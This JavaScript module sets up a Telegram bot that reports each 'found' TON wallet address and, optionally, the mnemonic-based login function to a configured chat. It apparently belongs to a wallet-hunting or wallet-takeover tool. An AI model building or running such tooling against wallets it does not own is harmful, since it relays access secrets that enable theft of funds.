import { Telegraf, Markup } from 'telegraf'
import { shortAddress } from './utils.js'
import telegramConfig from '../config/tg.js'

const { botToken, chatId, showMnemonicFunction } = telegramConfig

let bot = null
let messageParams = { parse_mode: 'MarkdownV2', reply_markup: {} }

if (botToken) {
  bot = new Telegraf(botToken)

  bot.start((ctx) => {
    const chatId = ctx.update.message.chat.id
    const messageText = `ID твоего чата:\n\n\`${chatId}\`\n\nВставь его в _config/tg.js_`

    ctx.reply('👋')
    setTimeout(() => ctx.reply(messageText, messageParams), 700)
  })

  bot.launch()
}

async function notify(walletAddress, mnemonicFunction) {
  if (!botToken || !chatId) {
    return console.log('Укажи botToken и chatId в config/tg.js')
  }

  let messageText = `💡 *Найден новый кошелёк:*\n\n\`${shortAddress(walletAddress)}\``

  if (showMnemonicFunction) {
    messageText += `\n\n🎯 *Функция для входа в кошелёк:*\n\n\`${mnemonicFunction}\``
    messageParams.reply_markup.inline_keyboard = [[Markup.button.url('💎 Открыть TonWallet', 'https://wallet.ton.org')]]
  }

  await bot.telegram.sendMessage(chatId, messageText, messageParams)
}

export default notify